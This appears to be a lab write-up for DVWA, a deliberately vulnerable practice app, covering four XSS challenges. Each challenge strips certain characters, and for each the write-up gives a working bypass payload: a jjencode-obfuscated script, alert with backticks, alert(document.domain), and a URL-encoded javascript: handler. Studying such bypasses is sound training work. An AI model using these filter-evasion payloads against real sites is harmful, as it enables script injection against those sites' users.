No Alphabets and Digits

$_GET['payload'] parameter is directly included in the output of the script without being properly sanitized or validated.

![image](https://github.com/nahcusira/dvwa/assets/87233531/62b6b9b0-913c-4c7a-bb8c-95091d8c0dca)

The preg_replace() function call is attempting to remove any alphanumeric characters from the payload parameter. But we can 
use payload without alphanumeric using jjencode: [jjencode - Encode any JavaScript program using only symbols (utf-8.jp)](https://utf-8.jp/public/jjencode.html)

already available <script></script> so we just need to add alert('XSS') to finish

![image](https://github.com/nahcusira/dvwa/assets/87233531/3a772610-edb3-4280-bad5-9dfeec214746)

$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"('\\"+$.__$+$._$$+$.___+"\\"+$.__$+$._$_+$._$$+"\\"+$.__$+$._$_+$._$$+"')"+"\"")())();

![image](https://github.com/nahcusira/dvwa/assets/87233531/98d91768-b3d2-4a19-8e24-49352ea023bb)

No Parentheses

$_GET['payload'] parameter removes any parentheses characters and any strings containing the letters "o" and "n" in sequence (which would likely match many common JavaScript event handlers such as onclick or onload).

![image](https://github.com/nahcusira/dvwa/assets/87233531/755789bc-5953-494b-ad96-a19bdb88de7f)

But we can use payload without parentheses characters and any strings containing the letters "o" and "n": 
<script>alert`XSS`</script>

![image](https://github.com/nahcusira/dvwa/assets/87233531/e54f0c62-930b-4e84-b8b6-ff6061abe27d)

No Quotes

$_GET['payload'] parameter uses the preg_replace() function to remove any single quotes, double quotes, backticks, ampersands, and hash symbols from the input.

![image](https://github.com/nahcusira/dvwa/assets/87233531/20849466-b722-48ac-aac4-d55bbac33105)

But we can use payload without single quotes: 
<script> alert(document.domain) </script>

![image](https://github.com/nahcusira/dvwa/assets/87233531/391e371b-9339-4e85-b482-a70e82eb1427)

No Parentheses Again

The preg_replace() function is used to remove any backticks, parentheses, angle brackets, ampersands, and hash symbols from the $_GET['payload'] parameter. The resulting string is then used as the id attribute of a span element, and the original input is passed through the htmlspecialchars() function to encode any special characters

![image](https://github.com/nahcusira/dvwa/assets/87233531/45cc0c0d-217a-4446-bb7f-34de7bd9de98)

But we can get around by encoding parentheses and single quotes by: https://www.w3schools.com/tags/ref_urlencode.ASP

![image](https://github.com/nahcusira/dvwa/assets/87233531/a5ae2119-4a9a-41b3-90a0-a09985e12ca7)

<script>"onmouseleave="location='javascript:alert%28%27XSS%27%29'"</script>

![image](https://github.com/nahcusira/dvwa/assets/87233531/a527f8bb-15c7-4a71-b402-ba55403b5acb)
